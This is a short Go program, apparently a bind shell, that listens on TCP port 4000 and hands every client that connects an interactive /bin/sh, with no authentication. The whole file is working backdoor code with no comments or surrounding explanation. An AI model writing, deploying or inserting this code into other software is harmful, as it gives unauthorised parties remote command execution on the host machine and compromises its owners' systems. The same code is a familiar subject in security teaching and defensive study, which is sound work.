package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func handle(conn net.Conn) {
	log.Println("Handling connection")

	cmd := exec.Command("/bin/sh", "-i")

	rp, wp := io.Pipe()

	cmd.Stdin = conn

	cmd.Stdout = wp

	go io.Copy(conn, rp)

	cmd.Run()
	conn.Close()

}

func main() {
	listener, err := net.Listen("tcp", ":4000")

	if err != nil {
		log.Fatalln("Unable to bind to port")
	}

	for {
		conn, err := listener.Accept()

		log.Println("Accepted connection from client")

		if err != nil {
			log.Fatalln("Unable to accept connection")
		}

		go handle(conn)
	}
}
